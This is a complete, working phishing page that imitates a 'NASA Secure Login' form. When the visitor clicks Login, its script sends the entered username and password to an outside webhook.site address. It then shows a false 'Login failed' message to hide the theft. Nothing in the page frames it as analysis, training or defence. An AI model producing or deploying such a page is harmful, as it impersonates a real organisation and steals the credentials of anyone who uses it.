<!DOCTYPE html>
<html>
<head>
  <title>NASA Secure Login</title>
  <meta charset="utf-8">
  <style>
    body {
      background: #f0f0f0;
      font-family: Arial;
      text-align: center;
      padding-top: 80px;
    }
    .box {
      background: #fff;
      padding: 40px;
      margin: auto;
      width: 300px;
      border-radius: 8px;
      box-shadow: 0 0 10px #ccc;
    }
    input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
    }
    button {
      padding: 10px 20px;
      background: #003366;
      color: #fff;
      border: none;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>NASA Secure Login</h2>
    <input id="user" placeholder="Username"><br>
    <input id="pass" type="password" placeholder="Password"><br>
    <button onclick="send()">Login</button>
  </div>
  <script>
    function send() {
      const u = document.getElementById('user').value;
      const p = document.getElementById('pass').value;
      fetch('https://webhook.site/f988f5a7-6736-4a39-bbf2-7314ca91aa7e?user=' + encodeURIComponent(u) + '&pass=' + encodeURIComponent(p));
      alert('Login failed. Please try again later.');
    }
  </script>
</body>
</html>
